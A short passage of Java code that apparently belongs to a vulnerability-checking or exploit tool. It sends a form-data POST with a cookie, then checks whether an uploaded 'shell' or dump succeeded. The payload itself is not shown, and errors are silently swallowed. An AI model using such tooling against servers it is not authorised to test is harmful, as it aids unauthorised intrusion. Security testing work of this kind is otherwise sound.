                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }
}
